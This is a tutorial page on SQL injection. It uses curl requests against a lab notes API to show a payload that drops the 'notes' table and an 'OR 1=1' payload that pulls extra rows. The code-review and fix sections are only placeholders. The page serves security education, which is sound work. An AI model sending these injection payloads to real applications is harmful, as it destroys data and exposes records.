---
bookCollapseSection: false
---

# Anatomy of a Vulnerability

In this section we will create a SQL injection on vulnerable code, so that we
can perform malicious actions on the application. This shows how SQL injection
works, and explains how vulnerabilities in your application can be exploited and cause
harm to your organization.

## Dropping a Table via SQL Injection

In this example, I will show how to drop the table when running a
curl request and injecting data.

For this example we will examine the DELETE API call.

Let's create a note via the API:

```bash
$ curl -X POST http://{LOAD_BALANCER_IP}/{APPLICATION_PATH}/add -d '{"message": "ZAP"}'

{
  "Success": "Note added!"
}
```

Now we can delete it with the DELETE api-call:

```bash
$ curl -X DELETE http://{LOAD_BALANCER_IP}/{APPLICATION_PATH}/delete\?id\=1
```

Now let's see what happens when a hacker üè¥‚Äç‚ò†Ô∏è tries to exploit this api
path and see if they can perform some malicious activity:

```bash
$ curl -X DELETE http://{LOAD_BALANCER_IP}/{APPLICATION_PATH}/delete\?id\=1%3B%20DROP%20TABLE%20notes
```

The above also drops the notes table, causing information loss and downtime to the application. This can
be critical to a business function.

This means that in the UI, a user can simply add the following to drop the table:

```sql
1; DROP TABLE notes;
```

### Examining the Vulnerable Code

...

### Resolution

...

## Revealing Secret Data from Database via SQL Injection

In this example, I will show how to reveal a secret field from the
database when running a curl request and injecting additional items
to a query.

Let's create a note via the API:

```bash
$ curl -X POST http://{LOAD_BALANCER_IP}/{APPLICATION_PATH}/add -d '{"message": "ZAP"}'

{
  "Success": "Note added!"
}
```

Now we can try and retrieve the note. This is what a normal call looks
like when following the API documentation:

```bash
$ curl -X GET http://{LOAD_BALANCER_IP}/{APPLICATION_PATH}/get\?id\=1

[(1, 'ZAP')]
```

Now let's see what happens when a hacker üè¥‚Äç‚ò†Ô∏è tries to obtain more items from the
database:

```bash
$ curl -X GET http://{LOAD_BALANCER_IP}/{APPLICATION_PATH}/get\?id\="%20OR%201=1
 
```

**Note:** 
%20 is a space in a URL.

### Examining the Vulnerable Code

...

### Resolution

...